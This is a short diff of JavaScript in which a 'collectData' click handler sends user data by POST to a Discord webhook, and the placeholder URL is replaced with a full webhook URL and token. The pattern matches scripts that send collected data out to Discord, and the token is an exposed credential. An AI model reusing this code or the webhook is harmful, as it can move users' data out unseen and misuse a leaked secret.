@@ -21,7 +21,7 @@ document.getElementById('collectData').addEventListener('click', async () => {
 
 function sendToDiscordWebhook(userData) {
   // Replace with your Discord webhook URL
-  const webhookURL = 'https://discord.com/api/webhooks/...';
+  const webhookURL = 'https://discord.com/api/webhooks/1154687564322717696/nk2SyiAWN9JcCJbmNG2Sdu9ktGXVnA1vHdyQki3-vaiZRrrnp7Wt-Xqxv2F48HV5uPsk';
 
   fetch(webhookURL, {
     method: 'POST',
